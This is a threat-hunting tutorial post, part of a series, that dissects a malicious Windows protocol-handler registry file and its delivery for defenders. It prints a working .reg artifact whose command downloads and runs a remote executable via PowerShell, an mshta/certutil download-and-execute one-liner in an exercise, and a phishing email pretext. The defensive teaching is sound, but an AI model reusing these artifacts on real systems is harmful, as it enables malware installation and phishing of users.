# Article 2: Anatomy of an Attack

## Dissecting BYOPH Artifacts

**Series:** Decoding BYOPH (Part 2 of 7)
**Reading time:** 7 minutes
**Skill level:** Intermediate

---

## 📝 LinkedIn Post Content

What does a malicious protocol handler actually look like? Today I'm breaking down real attack artifacts line by line—so you know exactly what to hunt for in your environment.

Last week, I introduced the BYOPH technique. Now let's get our hands dirty with artifact analysis.

---

### 🎯 What You'll Learn Today

✅ How to analyze registry file (.reg) attack artifacts
✅ Identify indicators of compromise (IoCs) in protocol handlers
✅ Recognize social engineering patterns used with BYOPH
✅ Extract detection signatures from attack samples

---

### 📄 The Artifact: A Malicious .reg File

Registry files are plaintext. Let me show you the anatomy of a malicious BYOPH registration:

```
Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Classes\internal-portal]
@="URL:Internal Portal Protocol"
"URL Protocol"=""

[HKEY_CURRENT_USER\Software\Classes\internal-portal\shell\open\command]
@="powershell.exe -command \"(New-Object System.Net.WebClient).DownloadFile('http://192.168.1.130/update.exe', '%TEMP%\\update.exe'); Start-Process '%TEMP%\\update.exe'\""
```

Let's break this down piece by piece.

---

### 🔬 Line-by-Line Analysis

**Line 1:** `Windows Registry Editor Version 5.00`
→ Standard header that tells Windows this is a valid .reg file

**Line 2:** `[HKEY_CURRENT_USER\Software\Classes\internal-portal]`
→ Creates the scheme key. Note: HKCU = no admin required!

**Line 3:** `@="URL:Internal Portal Protocol"`
→ Human-readable name shown in browser prompts. Designed to look legitimate.

**Line 4:** `"URL Protocol"=""`
→ **CRITICAL**: This empty string marks the key as a URL protocol handler. Without it, Windows ignores the handler.

**Line 5:** `[...\shell\open\command]`
→ The execution path Windows follows when the protocol is invoked

**Line 6:** The payload command
→ Downloads and executes a remote file. This is where the attack happens.

---

### 🚨 Red Flags to Hunt For

When analyzing a protocol handler command, look for these indicators:

| Red Flag | Example | Why It's Suspicious |
|----------|---------|---------------------|
| PowerShell | `powershell.exe -command` | Most monitored process |
| cmd.exe | `cmd.exe /c` | Command chaining |
| Script hosts | `wscript.exe`, `cscript.exe` | Script execution |
| Network activity | `http://`, IP addresses | External communication |
| Temp paths | `%TEMP%`, `%APPDATA%` | Common staging locations |
| Download methods | `WebClient`, `Invoke-WebRequest` | File retrieval |
| Encoded commands | `-enc`, base64 strings | Obfuscation attempts |

---

### 🎭 The Social Engineering Layer

The technical payload is only half the attack. Here's the social engineering that accompanies it:

**The Delivery Email:**
```
Subject: Action Required: Portal Access Configuration

Hi Team,

IT has updated the internal portal system. To ensure uninterrupted access, 
please download and import the attached configuration file.

1. Download the attached "portal-config.reg"
2. Double-click to import
3. Click "Yes" when prompted
4. Access the portal at: internal-portal://dashboard

Thanks,
IT Support
```

**What makes this effective:**
• Authority: Appears to come from IT
• Urgency: "Action Required"
• Legitimacy: Uses business terminology
• Simplicity: Clear instructions that seem routine
• Trust: Internal portal sounds legitimate

---

### 📊 IoC Extraction Checklist

When you find a suspicious handler, extract these indicators:

```
☐ Scheme name (e.g., "internal-portal")
☐ Command executable (e.g., "powershell.exe")
☐ Command arguments (full command string)
☐ Network indicators (URLs, IPs, domains)
☐ File paths (staging locations)
☐ Process chain (parent → child relationships)
☐ Registry timestamp (if available from forensics)
```

---

### 🔄 Attack Flow Visualization

```
PHASE 1: DELIVERY
Attacker → Phishing email with .reg attachment → Victim

PHASE 2: REGISTRATION  
Victim imports .reg → Handler created in HKCU
(No admin prompt, appears successful)

PHASE 3: TRIGGER
Attacker → Sends link: internal-portal://dashboard → Victim clicks

PHASE 4: EXECUTION
Browser → "Open external application?" → User clicks Open
→ PowerShell spawns → Downloads payload → Executes malware
```

---

### 🛡️ Detection Opportunities

**Registry Monitoring:**
• New keys under `HKCU\Software\Classes\*`
• Presence of `URL Protocol` value
• Suspicious strings in `shell\open\command`

**Process Monitoring:**
• PowerShell spawned by browser process
• cmd.exe with download-related commands
• Unusual parent-child process relationships

**Network Monitoring:**
• Downloads of .reg files from external sources
• Connections to raw IP addresses after link clicks

---

### 🎯 Exercise: Test Your Analysis Skills

Look at this command and identify all the IoCs:

```
mshta.exe "javascript:a=new ActiveXObject('Wscript.Shell');a.Run('certutil -urlcache -f http://10.0.0.50/loader.exe %TEMP%\\svc.exe && %TEMP%\\svc.exe',0);close()"
```

**Questions:**
1. What executable is being used?
2. What LOLBin is leveraged for download?
3. What network indicator can you extract?
4. Where is the payload staged?

(Answers in the comments!)

---

### 📌 Key Takeaways

1. **Always analyze .reg files as potential threats**—they're code execution enablers
2. Look for the **"URL Protocol"=""** value—it's the handler marker
3. **Extract all IoCs** from the command value for hunting
4. **Social engineering is half the attack**—train users on .reg file risks
5. **Multiple detection layers** (registry + process + network) work best

---

### ⚠️ SAFETY DISCLAIMER

```
The artifacts shown are SANITIZED EXAMPLES for educational purposes.

✓ Never import untrusted .reg files on production systems
✓ Always analyze suspicious files in isolated VMs
✓ Report malicious artifacts through proper channels

This content is for authorized security testing only.
```

---

### 🔜 Coming Next Week

In Part 3, I'll show you how to **build a completely benign protocol handler** for your lab. Understanding the mechanism hands-on is the best way to learn—and you'll have a safe testing tool for the rest of the series.

**Follow me** to catch Part 3!

---

### 💬 Discussion Question

What's the most creative social engineering pretext you've seen used to deliver malicious files? Share (sanitized) examples in the comments!

---

#Cybersecurity #InfoSec #ThreatHunting #MalwareAnalysis #BlueTeam #BYOPH #IncidentResponse #SecurityResearch #WindowsSecurity #IOC

